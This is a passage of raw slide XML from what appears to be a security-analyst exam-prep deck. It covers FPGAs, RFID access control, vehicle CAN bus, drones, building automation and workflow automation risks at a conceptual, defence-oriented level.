          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions highlight the FPGA's field-reprogrammable nature as both its advantage and the source of vulnerabilities that must be controlled.</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479</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Field Programmable Gate Array (FPGA)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Combination of SoC and embedded system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Programmable chip with the ability to be modified and reprogrammed in the field</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Must use special device to overwrite the firmware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Upgradable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cost effective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Simplicity sometimes leads to vulnerabilities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480</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Physical Access Control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Physical access control systems govern who can enter facilities or areas, and a common example is RFID (radio-frequency identification), where a chip in a badge or fob communicates a unique identifier to a reader over radio. Because the readers are physically accessible and the signals travel over the air, attackers can attempt to reverse-engineer and spoof the credential.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerabilities in these systems can let an attacker bypass access controls entirely, and the most popular techniques are replay attacks, capturing and retransmitting a valid credential's signal, and cloning, copying a legitimate card onto a duplicate. Weak or unencrypted RFID technologies such as low-frequency proximity cards are especially susceptible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because a defeated physical access control undermines every downstream security layer, so using encrypted smart-card credentials, mutual authentication, and monitoring for anomalous badge activity is critical.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for RFID cited with replay and cloning as the popular attack methods that allow bypassing physical access control.</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481</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Physical Access Control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Example: RFID</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Radiofrequency identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Chip that uniquely communicates with receiver</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Physical readers make reverse engineering and spoofing possible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerabilities can allow attackers to bypass access control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Replay and cloning are popular attack methods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482</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Vehicles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Modern vehicles are essentially networks of computers on wheels, with internet connectivity (telematics, infotainment, cellular and Wi-Fi links) that grants access to and, in some cases, control over subsystems such as braking, steering, acceleration, door locks and the engine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These subsystems communicate over the Controller Area Network (CAN bus), a broadcast, priority-based serial protocol that was designed for reliability among trusted components and therefore has no authentication or encryption, so any node that reaches the bus can inject or spoof messages to other electronic control units (ECUs).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Researchers have publicly demonstrated CAN bus exploits that remotely alter vehicle operation, reaching the internal bus through an exposed external interface such as cellular, Bluetooth or a compromised infotainment head unit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because a connected vehicle is an operational-technology asset whose vulnerabilities can cause physical harm and life safety impact, and it must be inventoried, patched and monitored like any other attack surface.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect it as an embedded/cyber-physical target where the CAN bus is named as the insecure in-vehicle protocol lacking authentication that enables remote manipulation of safety systems.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483</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Vehicles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Vehicles of all types are increasingly connected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Internet connectivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Access to many subsystems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Control of some subsystems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Also opens up vulnerabilities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484</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Typical CAN Bus Configuration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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Controller Area Network (CAN bus)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defines communication among vehicle component</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_a32d604f30.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2244593"/>
            <a:ext cx="4937760" cy="3374653"/>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485</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Typical CAN Bus Configuration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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Controller Area Network (CAN bus)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defines communication among vehicle component</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_10e53c9dc2.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2275381"/>
            <a:ext cx="4937760" cy="3313077"/>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486</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Vehicles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Controller Area Network (CAN bus)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  CAN exploits (to alter vehicle operation) have been demonstrated</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487</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Drones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Drones (unmanned aerial vehicles) are cyber-physical assets that raise two distinct security concerns: a malicious drone operated by an attacker (for surveillance, dropping a rogue access point, or physical intrusion over a fence) and an innocent, legitimately owned drone that an attacker compromises.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because command-and-control and telemetry links are often unencrypted or weakly authenticated, an attacker has many attack options including GPS spoofing to redirect the aircraft, jamming to force a failsafe, and hijacking the control channel to seize the drone and repurpose it for malicious use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC or security analyst, drones represent both a physical-perimeter threat that can bypass network defenses and a fleet of connected endpoints that must be secured, monitored and geofenced against takeover.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: It appears as an example of an unmanned/embedded system whose insecure wireless control and GPS links make it subject to hijacking, spoofing and jamming.</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488</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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ACCESS AND VEHICLES RISK</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Drones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Can be malicious</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Controlled by an attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Can be innocent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Drone operators may have their drones hijacked and used for malicious purposes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Many options for attacks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489</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Building Automation Systems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A Building Automation System (BAS) is a network of connected cyber-physical devices that combine computing with a physical effect, centrally managing functions such as lighting, HVAC and environmental control, physical access control, elevators/robots, smoke detection and fire suppression.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These systems often run legacy or proprietary protocols (for example BACnet or Modbus) with little authentication, and they are frequently bridged onto the corporate IP network, giving an attacker who compromises the BAS a foothold that can pivot into IT or be used directly for disruption.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because a BAS vulnerability can affect a building's usability, inhabitability and safety, an analyst must treat it as a high-consequence OT asset, segmenting it from IT networks and monitoring it for anomalous or unauthorized commands.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Tested as a cyber-physical/OT category whose life-safety impact and IT/OT convergence make network segmentation the expected control.</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490</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Building Automation Systems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Network of connected cyber-physical devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Combination of computing device that has impact on physical world</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Robots</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Lighting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Environmental control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Physical access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Smoke detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Fire suppression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerabilities can impact a building’s usability, inhabitability, and safety</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491</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Workflow and Process Automation Systems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Workflow and process automation systems are software platforms that direct or control a sequence of business steps, such as project management, document management, and Software Configuration Management (SCM), and their value comes from operating autonomously with minimal human oversight.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  That same autonomy is the risk: a malicious alteration of the defined workflow (for example rerouting an approval, skipping a review gate, or changing a build/deployment step) can propagate automatically and unnoticed because no human validates each execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For this reason an analyst should ensure the intended workflow is externally audited and monitored against a known-good baseline, so unauthorized changes to the automation logic are detected before they cause damage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: It shows up as an automation asset where the exam stresses that unmonitored autonomous workflows can be silently tampered with, making external auditing of the desired process the key safeguard.</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492</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Workflow and Process Automation Systems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Systems that direct and/or control workflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Project management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Document management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Software Configuration Management (SCM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Value is in autonomy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vulnerabilities can include malicious workflow alterations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
